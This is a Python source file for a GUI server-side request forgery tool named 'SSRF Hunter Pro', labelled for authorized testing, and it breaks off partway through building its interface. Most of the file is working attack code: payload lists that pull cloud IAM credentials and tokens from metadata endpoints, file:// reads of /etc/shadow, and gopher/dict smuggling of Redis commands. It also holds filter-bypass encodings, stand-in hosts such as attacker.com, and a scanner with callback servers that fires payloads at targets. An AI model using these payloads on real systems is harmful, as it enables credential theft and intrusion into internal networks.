#!/usr/bin/env python3
"""
SSRF Hunter Pro - Advanced Server-Side Request Forgery Detection Tool
For authorized security testing and bug bounty programs only.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import socket
import socketserver
import http.server
import json
import uuid
import time
import hashlib
import base64
import urllib.parse
import ipaddress
import re
import ssl
import struct
from datetime import datetime
from collections import defaultdict
from typing import Dict, List, Optional, Tuple
import queue
import os


# ═══════════════════════════════════════════════════════════════════════════════
# HACKER THEME CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

class HackerTheme:
    """Dark hacker theme colors and fonts"""
    BG_DARK = "#0a0a0a"
    BG_MEDIUM = "#1a1a1a"
    BG_LIGHT = "#2a2a2a"
    FG_GREEN = "#00ff41"
    FG_BRIGHT_GREEN = "#39ff14"
    FG_DIM_GREEN = "#00cc33"
    FG_RED = "#ff0040"
    FG_ORANGE = "#ff6600"
    FG_CYAN = "#00ffff"
    FG_YELLOW = "#ffff00"
    FG_WHITE = "#ffffff"
    FG_GRAY = "#888888"
    ACCENT = "#00ff41"
    BORDER = "#333333"

    FONT_MONO = ("Consolas", 10)
    FONT_MONO_BOLD = ("Consolas", 10, "bold")
    FONT_MONO_LARGE = ("Consolas", 12)
    FONT_TITLE = ("Consolas", 14, "bold")
    FONT_HEADER = ("Consolas", 11, "bold")


# ═══════════════════════════════════════════════════════════════════════════════
# PAYLOAD GENERATORS
# ═══════════════════════════════════════════════════════════════════════════════

class PayloadGenerator:
    """Generates various SSRF payloads with bypass techniques"""

    # Cloud Metadata Endpoints
    CLOUD_METADATA = {
        "AWS": [
            "<http://169.254.169.254/latest/meta-data/>",
            "<http://169.254.169.254/latest/meta-data/iam/security-credentials/>",
            "<http://169.254.169.254/latest/meta-data/hostname>",
            "<http://169.254.169.254/latest/meta-data/local-ipv4>",
            "<http://169.254.169.254/latest/meta-data/public-ipv4>",
            "<http://169.254.169.254/latest/user-data/>",
            "<http://169.254.169.254/latest/dynamic/instance-identity/document>",
            "<http://169.254.169.254/latest/api/token>",
        ],
        "GCP": [
            "<http://169.254.169.254/computeMetadata/v1/>",
            "<http://metadata.google.internal/computeMetadata/v1/>",
            "<http://169.254.169.254/computeMetadata/v1/project/>",
            "<http://169.254.169.254/computeMetadata/v1/instance/>",
            "<http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token>",
            "<http://169.254.169.254/computeMetadata/v1/project/project-id>",
        ],
        "Azure": [
            "<http://169.254.169.254/metadata/instance?api-version=2021-02-01>",
            "<http://169.254.169.254/metadata/identity/oauth2/token>",
            "<http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01>",
            "<http://169.254.169.254/metadata/instance/network?api-version=2021-02-01>",
        ],
        "DigitalOcean": [
            "<http://169.254.169.254/metadata/v1/>",
            "<http://169.254.169.254/metadata/v1/id>",
            "<http://169.254.169.254/metadata/v1/hostname>",
            "<http://169.254.169.254/metadata/v1/region>",
        ],
        "Alibaba": [
            "<http://100.100.100.200/latest/meta-data/>",
            "<http://100.100.100.200/latest/meta-data/instance-id>",
            "<http://100.100.100.200/latest/meta-data/hostname>",
        ],
        "Oracle": [
            "<http://169.254.169.254/opc/v1/instance/>",
            "<http://169.254.169.254/opc/v2/instance/>",
        ],
        "Kubernetes": [
            "<https://kubernetes.default.svc/>",
            "<https://kubernetes.default/>",
            "<http://localhost:10255/pods>",
            "<http://localhost:10255/metrics>",
        ]
    }

    # Protocol Smuggling Payloads
    PROTOCOL_PAYLOADS = {
        "file": [
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/net/tcp",
            "file:///proc/net/fib_trie",
            "file://localhost/etc/passwd",
            "file://127.0.0.1/etc/passwd",
            "file:///c:/windows/system32/drivers/etc/hosts",
            "file:///c:/windows/win.ini",
        ],
        "gopher": [
            "gopher://127.0.0.1:6379/_INFO",
            "gopher://127.0.0.1:11211/_stats",
            "gopher://127.0.0.1:25/_EHLO%20localhost",
            "gopher://127.0.0.1:3306/_",
        ],
        "dict": [
            "dict://127.0.0.1:6379/INFO",
            "dict://127.0.0.1:11211/stats",
            "dict://localhost:6379/KEYS *",
        ],
        "tftp": [
            "tftp://attacker.com/file",
        ],
        "ldap": [
            "ldap://127.0.0.1:389/",
            "ldap://localhost/",
        ],
        "sftp": [
            "sftp://attacker.com/",
        ]
    }

    @staticmethod
    def encode_ip_variations(ip: str) -> List[str]:
        """Generate IP address encoding variations"""
        variations = [ip]

        try:
            ip_obj = ipaddress.IPv4Address(ip)
            ip_int = int(ip_obj)
            octets = ip.split('.')

            # Decimal encoding
            variations.append(str(ip_int))

            # Hexadecimal encoding
            variations.append(hex(ip_int))
            variations.append(f"0x{ip_int:08x}")

            # Octal encoding
            oct_ip = '.'.join([oct(int(o)) for o in octets])
            variations.append(oct_ip)

            # Hex octets
            hex_ip = '.'.join([hex(int(o)) for o in octets])
            variations.append(hex_ip)

            # Mixed encodings
            variations.append(f"{int(octets[0])}.{int(octets[1])}.{int(ip_int & 0xFFFF)}")

            # IPv6 mapping
            variations.append(f"::ffff:{ip}")
            variations.append(f"0:0:0:0:0:ffff:{octets[0]}.{octets[1]}.{octets[2]}.{octets[3]}")

            # URL encoding variations
            url_encoded = '.'.join([f"%{int(o):02x}" for o in octets])
            variations.append(url_encoded)

            # Padded zeros
            variations.append('.'.join([f"{int(o):03d}" for o in octets]))

        except Exception:
            pass

        return list(set(variations))

    @staticmethod
    def generate_localhost_bypasses() -> List[str]:
        """Generate localhost bypass variations"""
        bypasses = [
            # Standard
            "localhost",
            "127.0.0.1",
            "127.1",
            "127.0.1",

            # IPv6
            "::1",
            "::127.0.0.1",
            "0:0:0:0:0:0:0:1",
            "[::1]",
            "[0:0:0:0:0:0:0:1]",

            # Decimal
            "2130706433",

            # Hex
            "0x7f000001",
            "0x7f.0x0.0x0.0x1",

            # Octal
            "0177.0.0.01",
            "0177.0000.0000.0001",

            # Mixed
            "127.0.0.1.xip.io",
            "127.0.0.1.nip.io",
            "localtest.me",
            "spoofed.burpcollaborator.net",

            # Zero variations
            "0.0.0.0",
            "0",
            "0x0.0x0.0x0.0x0",

            # Alternate
            "127.127.127.127",
            "127.000.000.001",
        ]
        return bypasses

    @staticmethod
    def generate_url_bypass_payloads(target: str, callback: str) -> List[str]:
        """Generate URL parser inconsistency bypasses"""
        payloads = [
            # Basic
            f"{callback}",

            # With credentials
            f"<http://user>@{callback}",
            f"<http://user>:pass@{callback}",

            # Fragment tricks
            f"http://{callback}#{target}",
            f"http://{target}#{callback}",

            # Parser confusion
            f"http://{target}@{callback}",
            f"http://{callback}%23@{target}",
            f"http://{callback}%2523@{target}",

            # Backslash tricks
            f"http://{target}\\\\@{callback}",
            f"http://{callback}\\\\@{target}",

            # Tab and newline
            f"http://{callback}%09{target}",
            f"http://{callback}%0d%0a{target}",

            # Protocol-relative
            f"//{callback}",
            f"\\\\/\\\\/{callback}",

            # Port confusion
            f"http://{callback}:80",
            f"http://{callback}:443",
            f"http://{callback}:22",

            # Path confusion
            f"http://{target}/../../../{callback}",
            f"http://{callback}/.{target}",

            # Scheme variations
            f"http://{callback}",
            f"https://{callback}",
            f"HTTP://{callback}",
            f"Http://{callback}",

            # Unicode normalization
            f"http://{callback}%E3%80%82{target}",
            f"<http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ>",
        ]
        return payloads

    @staticmethod
    def generate_redirect_payloads(callback: str) -> List[str]:
        """Generate redirect-based bypass payloads"""
        encoded_callback = urllib.parse.quote(callback, safe='')
        payloads = [
            f"<http://httpbin.org/redirect-to?url={encoded_callback}>",
            f"<http://httpbin.org/redirect-to?url=http://{encoded_callback}>",
            f"<https://ngrok.io/redirect?url={encoded_callback}>",
        ]
        return payloads

    @staticmethod
    def generate_dns_rebinding_domains(callback_ip: str) -> List[str]:
        """Generate DNS rebinding domains"""
        domains = [
            f"make-{callback_ip.replace('.', '-')}-rebind.1u.ms",
            f"rebind-{callback_ip.replace('.', '-')}-127-0-0-1.rbndr.us",
            f"7f000001.{callback_ip.replace('.', '-')}.rbndr.us",
        ]
        return domains

    @staticmethod
    def generate_gopher_payload(host: str, port: int, data: str) -> str:
        """Generate Gopher protocol payload"""
        encoded_data = urllib.parse.quote(data.replace('\\n', '\\r\\n'))
        return f"gopher://{host}:{port}/_{encoded_data}"

    @staticmethod
    def generate_redis_gopher(command: str) -> str:
        """Generate Redis command via Gopher"""
        parts = command.split(' ')
        payload = f"*{len(parts)}\\r\\n"
        for part in parts:
            payload += f"${len(part)}\\r\\n{part}\\r\\n"
        return PayloadGenerator.generate_gopher_payload("127.0.0.1", 6379, payload)


# ═══════════════════════════════════════════════════════════════════════════════
# CALLBACK SERVER
# ═══════════════════════════════════════════════════════════════════════════════

class CallbackTracker:
    """Track callbacks with tokens and metadata"""

    def __init__(self):
        self.callbacks: Dict[str, List[dict]] = defaultdict(list)
        self.lock = threading.Lock()

    def generate_token(self, context: str = "") -> str:
        """Generate unique tracking token"""
        unique_id = str(uuid.uuid4())[:8]
        timestamp = int(time.time())
        token = f"{unique_id}-{timestamp}"

        with self.lock:
            self.callbacks[token] = []

        return token

    def record_callback(self, token: str, source_ip: str, request_type: str,
                       details: dict = None):
        """Record a callback hit"""
        with self.lock:
            self.callbacks[token].append({
                'timestamp': datetime.now().isoformat(),
                'source_ip': source_ip,
                'type': request_type,
                'details': details or {}
            })

    def get_callbacks(self, token: str = None) -> dict:
        """Get callback records"""
        with self.lock:
            if token:
                return {token: self.callbacks.get(token, [])}
            return dict(self.callbacks)


class CallbackHTTPHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for callback server"""

    tracker: CallbackTracker = None
    log_queue: queue.Queue = None

    def log_message(self, format, *args):
        """Override to use custom logging"""
        if self.log_queue:
            self.log_queue.put(f"[HTTP] {self.client_address[0]} - {format % args}")

    def do_GET(self):
        self._handle_request("GET")

    def do_POST(self):
        self._handle_request("POST")

    def do_HEAD(self):
        self._handle_request("HEAD")

    def _handle_request(self, method: str):
        """Handle incoming callback request"""
        # Extract token from path
        path_parts = self.path.split('/')
        token = None

        for part in path_parts:
            if re.match(r'^[a-f0-9]{8}-\\d+$', part):
                token = part
                break

        # Record callback
        details = {
            'method': method,
            'path': self.path,
            'headers': dict(self.headers),
            'user_agent': self.headers.get('User-Agent', 'Unknown'),
        }

        if token and self.tracker:
            self.tracker.record_callback(
                token=token,
                source_ip=self.client_address[0],
                request_type='HTTP',
                details=details
            )

            if self.log_queue:
                self.log_queue.put(
                    f"[CALLBACK] Token: {token} | IP: {self.client_address[0]} | "
                    f"Path: {self.path}"
                )

        # Send response
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('X-SSRF-Hunter', 'callback-received')
        self.end_headers()

        response = f"SSRF Hunter Callback\\nToken: {token or 'unknown'}\\nTimestamp: {datetime.now().isoformat()}"
        self.wfile.write(response.encode())


class CallbackServer:
    """Manages HTTP callback server"""

    def __init__(self, host: str = "0.0.0.0", port: int = 8888):
        self.host = host
        self.port = port
        self.server = None
        self.thread = None
        self.running = False
        self.tracker = CallbackTracker()
        self.log_queue = queue.Queue()

    def start(self) -> bool:
        """Start the callback server"""
        try:
            CallbackHTTPHandler.tracker = self.tracker
            CallbackHTTPHandler.log_queue = self.log_queue

            self.server = socketserver.TCPServer(
                (self.host, self.port),
                CallbackHTTPHandler
            )
            self.server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.thread = threading.Thread(target=self.server.serve_forever)
            self.thread.daemon = True
            self.thread.start()

            self.running = True
            return True

        except Exception as e:
            self.log_queue.put(f"[ERROR] Failed to start server: {e}")
            return False

    def stop(self):
        """Stop the callback server"""
        if self.server:
            self.server.shutdown()
            self.server = None
            self.running = False


class DNSCallbackServer:
    """Simple DNS callback server for DNS-only SSRF detection"""

    def __init__(self, host: str = "0.0.0.0", port: int = 53):
        self.host = host
        self.port = port
        self.socket = None
        self.thread = None
        self.running = False
        self.tracker = CallbackTracker()
        self.log_queue = queue.Queue()

    def start(self) -> bool:
        """Start DNS server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.settimeout(1.0)

            self.running = True
            self.thread = threading.Thread(target=self._serve)
            self.thread.daemon = True
            self.thread.start()

            return True

        except Exception as e:
            self.log_queue.put(f"[ERROR] Failed to start DNS server: {e}")
            return False

    def _serve(self):
        """DNS server main loop"""
        while self.running:
            try:
                data, addr = self.socket.recvfrom(1024)
                self._handle_query(data, addr)
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    self.log_queue.put(f"[DNS ERROR] {e}")

    def _handle_query(self, data: bytes, addr: tuple):
        """Handle DNS query"""
        try:
            # Parse simple DNS query to extract domain
            domain = self._parse_dns_query(data)

            # Extract token from subdomain
            token = None
            parts = domain.split('.')
            for part in parts:
                if re.match(r'^[a-f0-9]{8}-\\d+$', part):
                    token = part
                    break

            if token:
                self.tracker.record_callback(
                    token=token,
                    source_ip=addr[0],
                    request_type='DNS',
                    details={'domain': domain}
                )

                self.log_queue.put(
                    f"[DNS CALLBACK] Token: {token} | IP: {addr[0]} | Domain: {domain}"
                )

            # Send minimal response
            response = self._build_dns_response(data, "127.0.0.1")
            self.socket.sendto(response, addr)

        except Exception as e:
            self.log_queue.put(f"[DNS ERROR] {e}")

    def _parse_dns_query(self, data: bytes) -> str:
        """Parse domain from DNS query"""
        domain_parts = []
        idx = 12  # Skip header

        while idx < len(data):
            length = data[idx]
            if length == 0:
                break
            idx += 1
            domain_parts.append(data[idx:idx+length].decode('utf-8', errors='ignore'))
            idx += length

        return '.'.join(domain_parts)

    def _build_dns_response(self, query: bytes, ip: str) -> bytes:
        """Build minimal DNS response"""
        # Copy transaction ID and set response flags
        response = bytearray(query[:2])
        response += b'\\x81\\x80'  # Response flags
        response += query[4:6]   # Questions count
        response += b'\\x00\\x01'  # Answers count
        response += b'\\x00\\x00'  # Authority RRs
        response += b'\\x00\\x00'  # Additional RRs

        # Copy question section
        idx = 12
        while idx < len(query) and query[idx] != 0:
            idx += 1
        idx += 5
        response += query[12:idx]

        # Add answer
        response += b'\\xc0\\x0c'  # Pointer to domain
        response += b'\\x00\\x01'  # Type A
        response += b'\\x00\\x01'  # Class IN
        response += b'\\x00\\x00\\x00\\x3c'  # TTL 60
        response += b'\\x00\\x04'  # Data length

        # IP address
        ip_parts = [int(p) for p in ip.split('.')]
        response += bytes(ip_parts)

        return bytes(response)

    def stop(self):
        """Stop DNS server"""
        self.running = False
        if self.socket:
            self.socket.close()
            self.socket = None


# ═══════════════════════════════════════════════════════════════════════════════
# SSRF SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

class SSRFScanner:
    """Core SSRF scanning functionality"""

    def __init__(self, log_queue: queue.Queue):
        self.log_queue = log_queue
        self.stop_event = threading.Event()

    def log(self, message: str, level: str = "INFO"):
        """Log message to queue"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_queue.put(f"[{timestamp}] [{level}] {message}")

    def port_scan_via_ssrf(self, target_url: str, internal_host: str,
                           ports: List[int], timeout: float = 5.0) -> Dict[int, dict]:
        """Scan ports via SSRF response timing"""
        results = {}

        import urllib.request

        for port in ports:
            if self.stop_event.is_set():
                break

            test_url = f"http://{internal_host}:{port}"
            payload_url = target_url.replace("INJECT", urllib.parse.quote(test_url))

            try:
                start_time = time.time()
                req = urllib.request.Request(payload_url, headers={
                    'User-Agent': 'Mozilla/5.0 (SSRF Hunter)'
                })

                try:
                    response = urllib.request.urlopen(req, timeout=timeout)
                    elapsed = time.time() - start_time

                    results[port] = {
                        'status': 'open',
                        'response_time': elapsed,
                        'status_code': response.status,
                        'content_length': len(response.read())
                    }
                    self.log(f"Port {port}: OPEN (response time: {elapsed:.2f}s)", "SUCCESS")

                except urllib.error.HTTPError as e:
                    elapsed = time.time() - start_time
                    results[port] = {
                        'status': 'error',
                        'response_time': elapsed,
                        'error_code': e.code
                    }

                except urllib.error.URLError:
                    elapsed = time.time() - start_time
                    results[port] = {
                        'status': 'closed/filtered',
                        'response_time': elapsed
                    }

            except Exception as e:
                results[port] = {
                    'status': 'error',
                    'error': str(e)
                }

            time.sleep(0.1)  # Rate limiting

        return results

    def test_ssrf_payload(self, target_url: str, payload: str,
                          timeout: float = 10.0) -> dict:
        """Test a single SSRF payload"""
        import urllib.request

        result = {
            'payload': payload,
            'vulnerable': False,
            'response': None,
            'error': None
        }

        try:
            test_url = target_url.replace("INJECT", urllib.parse.quote(payload, safe=''))

            req = urllib.request.Request(test_url, headers={
                'User-Agent': 'Mozilla/5.0 (SSRF Hunter)',
                'Accept': '*/*',
            })

            start_time = time.time()
            response = urllib.request.urlopen(req, timeout=timeout)
            elapsed = time.time() - start_time

            content = response.read()

            result['response'] = {
                'status_code': response.status,
                'headers': dict(response.headers),
                'content_length': len(content),
                'response_time': elapsed,
                'content_preview': content[:500].decode('utf-8', errors='ignore')
            }

            # Check for indicators of successful SSRF
            indicators = [
                b'root:', b'passwd', b'localhost', b'127.0.0.1',
                b'metadata', b'instance', b'ami-', b'i-',
                b'iam', b'security-credentials', b'AccessKey',
                b'compute.internal', b'google', b'azure',
                b'redis', b'memcache', b'mysql'
            ]

            for indicator in indicators:
                if indicator in content.lower():
                    result['vulnerable'] = True
                    result['indicator'] = indicator.decode()
                    break

        except urllib.error.HTTPError as e:
            result['error'] = f"HTTP {e.code}: {e.reason}"
        except urllib.error.URLError as e:
            result['error'] = f"URL Error: {e.reason}"
        except Exception as e:
            result['error'] = str(e)

        return result

    def fingerprint_internal_service(self, response_content: bytes) -> List[str]:
        """Fingerprint internal services from response"""
        services = []

        fingerprints = {
            'Redis': [b'+PONG', b'redis_version:', b'-NOAUTH'],
            'Memcached': [b'STAT pid', b'STAT uptime', b'END'],
            'MySQL': [b'mysql_native_password', b'MariaDB'],
            'PostgreSQL': [b'PostgreSQL', b'FATAL:'],
            'MongoDB': [b'MongoDB', b'ismaster'],
            'Elasticsearch': [b'elasticsearch', b'lucene_version'],
            'Apache': [b'Apache/', b'Server: Apache'],
            'Nginx': [b'nginx/', b'Server: nginx'],
            'Jenkins': [b'Jenkins', b'X-Jenkins'],
            'Kubernetes': [b'kubernetes', b'apiVersion'],
            'Docker': [b'docker', b'Docker-'],
            'Consul': [b'consul', b'Consul'],
            'Vault': [b'vault', b'Vault'],
        }

        for service, patterns in fingerprints.items():
            for pattern in patterns:
                if pattern.lower() in response_content.lower():
                    services.append(service)
                    break

        return list(set(services))


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN GUI APPLICATION
# ═══════════════════════════════════════════════════════════════════════════════

class SSRFHunterGUI:
    """Main GUI Application"""

    def __init__(self):
        self.root = tk.Tk()
        self.root.title("⚡ SSRF Hunter Pro ⚡")
        self.root.geometry("1400x900")
        self.root.configure(bg=HackerTheme.BG_DARK)

        # Configure styles
        self.style = ttk.Style()
        self._configure_styles()

        # Initialize components
        self.callback_server = None
        self.dns_server = None
        self.log_queue = queue.Queue()
        self.scanner = SSRFScanner(self.log_queue)
        self.payload_generator = PayloadGenerator()
        self.scan_results = []

        # Build UI
        self._create_ui()

        # Start log processor
        self._process_logs()

    def _configure_styles(self):
        """Configure ttk styles for hacker theme"""
        self.style.theme_use('clam')

        # Configure notebook (tabs)
        self.style.configure('Hacker.TNotebook',
                           background=HackerTheme.BG_DARK,
                           borderwidth=0)
        self.style.configure('Hacker.TNotebook.Tab',
                           background=HackerTheme.BG_MEDIUM,
                           foreground=HackerTheme.FG_GREEN,
                           padding=[15, 8],
                           font=HackerTheme.FONT_MONO_BOLD)
        self.style.map('Hacker.TNotebook.Tab',
                      background=[('selected', HackerTheme.BG_LIGHT)],
                      foreground=[('selected', HackerTheme.FG_BRIGHT_GREEN)])

        # Configure frames
        self.style.configure('Hacker.TFrame',
                           background=HackerTheme.BG_DARK)
        self.style.configure('HackerLight.TFrame',
                           background=HackerTheme.BG_MEDIUM)

        # Configure labels
        self.style.configure('Hacker.TLabel',
                           background=HackerTheme.BG_DARK,
                           foreground=HackerTheme.FG_GREEN,
                           font=HackerTheme.FONT_MONO)
        self.style.configure('HackerTitle.TLabel',
                           background=HackerTheme.BG_DARK,
                           foreground=HackerTheme.FG_BRIGHT_GREEN,
                           font=HackerTheme.FONT_TITLE)

        # Configure buttons
        self.style.configure('Hacker.TButton',
                           background=HackerTheme.BG_LIGHT,
                           foreground=HackerTheme.FG_GREEN,
                           font=HackerTheme.FONT_MONO_BOLD,
                           padding=[10, 5])
        self.style.map('Hacker.TButton',
                      background=[('active', HackerTheme.FG_GREEN)],
                      foreground=[('active', HackerTheme.BG_DARK)])

        # Configure entry
        self.style.configure('Hacker.TEntry',
                           fieldbackground=HackerTheme.BG_MEDIUM,
                           foreground=HackerTheme.FG_GREEN,
                           insertcolor=HackerTheme.FG_GREEN)

        # Configure combobox
        self.style.configure('Hacker.TCombobox',
                           fieldbackground=HackerTheme.BG_MEDIUM,
                           background=HackerTheme.BG_LIGHT,
                           foreground=HackerTheme.FG_GREEN,
                           arrowcolor=HackerTheme.FG_GREEN)

        # Configure checkbutton
        self.style.configure('Hacker.TCheckbutton',
                           background=HackerTheme.BG_DARK,
                           foreground=HackerTheme.FG_GREEN,
                           font=HackerTheme.FONT_MONO)

        # Configure labelframe
        self.style.configure('Hacker.TLabelframe',
                           background=HackerTheme.BG_DARK,
                           foreground=HackerTheme.FG_GREEN)
        self.style.configure('Hacker.TLabelframe.Label',
                           background=HackerTheme.BG_DARK,
                           foreground=HackerTheme.FG_BRIGHT_GREEN,
                           font=HackerTheme.FONT_HEADER)

    def _create_ui(self):
        """Create the main UI"""
        # Header
        self._create_header()

        # Main notebook (tabs)
        self.notebook = ttk.Notebook(self.root, style='Hacker.TNotebook')
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=(5, 10))

        # Create tabs
        self._create_scanner_tab()
        self._create_payload_tab()
        self._create_callback_tab()
        self._create_cloud_tab()
        self._create_network_tab()
        self._create_results_tab()

        # Status bar
        self._create_status_bar()

    def _create_header(self):
        """Create application header"""
        header_frame = tk.Frame(self.root, bg=HackerTheme.BG_DARK)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        # ASCII Art Logo
        logo = """
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║  ███████╗███████╗██████╗ ███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗  ║
║  ██╔════╝██╔════╝██╔══██╗██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗ ║
║  ███████╗███████╗██████╔╝█████╗      ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝ ║
║  ╚════██║╚════██║██╔══██╗██╔══╝      ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗ ║
║  ███████║███████║██║  ██║██║         ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║ ║
║  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ ║
║                           ⚡ Advanced SSRF Detection Framework ⚡                        ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝"""

        logo_label = tk.Label(header_frame, text=logo,
                             font=("Consolas", 7),
                             fg=HackerTheme.FG_GREEN,
                             bg=HackerTheme.BG_DARK,
                             justify=tk.CENTER)
        logo_label.pack()

    def _create_scanner_tab(self):
        """Create main scanner tab"""
        tab = ttk.Frame(self.notebook, style='Hacker.TFrame')
        self.notebook.add(tab, text="🔍 SSRF Scanner")

        # Left panel - Configuration
        left_panel = ttk.Frame(tab, style='Hacker.TFrame')
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Target URL
        url_frame = ttk.LabelFrame(left_panel, text="Target Configuration",
                                   style='Hacker.TLabelframe')
        url_frame.pack(fill=tk.X, pady=(0, 10))

        tk.Label(url_frame, text="Target URL (use INJECT as placeholder):",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(anchor=tk.W, padx=10, pady=5)

        self.target_url = tk.Entry(url_frame, width=80,
                                  bg=HackerTheme.BG_MEDIUM,
                                  fg=HackerTheme.FG_GREEN,
                                  insertbackground=HackerTheme.FG_GREEN,
                                  font=HackerTheme.FONT_MONO)
        self.target_url.pack(fill=tk.X, padx=10, pady=5)
        self.target_url.insert(0, "<http://example.com/fetch?url=INJECT>")

        # Callback server
        tk.Label(url_frame, text="Callback Server (your server):",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(anchor=tk.W, padx=10, pady=5)

        callback_frame = tk.Frame(url_frame, bg=HackerTheme.BG_DARK)
        callback_frame.pack(fill=tk.X, padx=10, pady=5)

        self.callback_host = tk.Entry(callback_frame, width=40,
                                     bg=HackerTheme.BG_MEDIUM,
                                     fg=HackerTheme.FG_GREEN,
                                     insertbackground=HackerTheme.FG_GREEN,
                                     font=HackerTheme.FONT_MONO)
        self.callback_host.pack(side=tk.LEFT, padx=(0, 10))
        self.callback_host.insert(0, "your-server.com")

        tk.Label(callback_frame, text="Port:",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(side=tk.LEFT)

        self.callback_port = tk.Entry(callback_frame, width=8,
                                     bg=HackerTheme.BG_MEDIUM,
                                     fg=HackerTheme.FG_GREEN,
                                     insertbackground=HackerTheme.FG_GREEN,
                                     font=HackerTheme.FONT_MONO)
        self.callback_port.pack(side=tk.LEFT, padx=5)
        self.callback_port.insert(0, "8888")

        # Scan options
        options_frame = ttk.LabelFrame(left_panel, text="Scan Options",
                                       style='Hacker.TLabelframe')
        options_frame.pack(fill=tk.X, pady=10)

        self.scan_basic = tk.BooleanVar(value=True)
        self.scan_blind = tk.BooleanVar(value=True)
        self.scan_protocol = tk.BooleanVar(value=True)
        self.scan_cloud = tk.BooleanVar(value=True)
        self.scan_bypass = tk.BooleanVar(value=True)

        options = [
            (self.scan_basic, "Basic SSRF Detection"),
            (self.scan_blind, "Blind SSRF (OOB Detection)"),
            (self.scan_protocol, "Protocol Smuggling (file://, gopher://)"),
            (self.scan_cloud, "Cloud Metadata Endpoints"),
            (self.scan_bypass, "Apply Bypass Techniques"),
        ]

        for var, text in options:
            cb = tk.Checkbutton(options_frame, text=text, variable=var,
                              bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                              selectcolor=HackerTheme.BG_MEDIUM,
                              activebackground=HackerTheme.BG_DARK,
                              activeforeground=HackerTheme.FG_BRIGHT_GREEN,
                              font=HackerTheme.FONT_MONO)
            cb.pack(anchor=tk.W, padx=10, pady=2)

        # Timeout setting
        timeout_frame = tk.Frame(options_frame, bg=HackerTheme.BG_DARK)
        timeout_frame.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(timeout_frame, text="Request Timeout (seconds):",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(side=tk.LEFT)

        self.timeout_var = tk.StringVar(value="10")
        timeout_entry = tk.Entry(timeout_frame, width=5, textvariable=self.timeout_var,
                                bg=HackerTheme.BG_MEDIUM,
                                fg=HackerTheme.FG_GREEN,
                                insertbackground=HackerTheme.FG_GREEN,
                                font=HackerTheme.FONT_MONO)
        timeout_entry.pack(side=tk.LEFT, padx=10)

        # Control buttons
        btn_frame = tk.Frame(left_panel, bg=HackerTheme.BG_DARK)
        btn_frame.pack(fill=tk.X, pady=10)

        self.scan_btn = tk.Button(btn_frame, text="▶ START SCAN",
                                 command=self._start_scan,
                                 bg=HackerTheme.FG_GREEN,
                                 fg=HackerTheme.BG_DARK,
                                 font=HackerTheme.FONT_MONO_BOLD,
                                 width=15)
        self.scan_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = tk.Button(btn_frame, text="⬛ STOP",
                                 command=self._stop_scan,
                                 bg=HackerTheme.FG_RED,
                                 fg=HackerTheme.BG_DARK,
                                 font=HackerTheme.FONT_MONO_BOLD,
                                 width=15,
                                 state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        tk.Button(btn_frame, text="📋 Clear Log",
                 command=self._clear_log,
                 bg=HackerTheme.BG_LIGHT,
                 fg=HackerTheme.FG_GREEN,
                 font=HackerTheme.FONT_MONO,
                 width=12).pack(side=tk.LEFT, padx=5)

        # Log output
        log_frame = ttk.LabelFrame(left_panel, text="Scan Log",
                                   style='Hacker.TLabelframe')
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)

        self.log_text = scrolledtext.ScrolledText(log_frame, width=80, height=20,
                                                  bg=HackerTheme.BG_MEDIUM,
                                                  fg=HackerTheme.FG_GREEN,
                                                  insertbackground=HackerTheme.FG_GREEN,
                                                  font=HackerTheme.FONT_MONO)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Configure log text tags
        self.log_text.tag_configure("success", foreground=HackerTheme.FG_BRIGHT_GREEN)
        self.log_text.tag_configure("error", foreground=HackerTheme.FG_RED)
        self.log_text.tag_configure("warning", foreground=HackerTheme.FG_ORANGE)
        self.log_text.tag_configure("info", foreground=HackerTheme.FG_CYAN)

    def _create_payload_tab(self):
        """Create payload generator tab"""
        tab = ttk.Frame(self.notebook, style='Hacker.TFrame')
        self.notebook.add(tab, text="🧬 Payload Generator")

